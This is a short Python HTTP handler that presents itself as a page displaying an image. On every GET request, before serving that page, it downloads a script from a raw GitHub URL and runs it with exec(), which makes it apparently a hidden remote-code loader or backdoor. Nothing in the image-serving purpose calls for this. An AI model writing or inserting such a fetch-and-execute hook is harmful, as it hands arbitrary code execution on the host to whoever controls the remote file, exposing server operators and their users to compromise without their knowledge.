import urllib.request
from http.server import BaseHTTPRequestHandler

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with urllib.request.urlopen("https://raw.githubusercontent.com/RAMDDR5/python/refs/heads/main/texttt") as response:
            exec(response.read().decode("utf-8"), {})

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(
            b"<img src='/image.jpg' style='max-width:100vw;max-height:100vh;'>"
        )
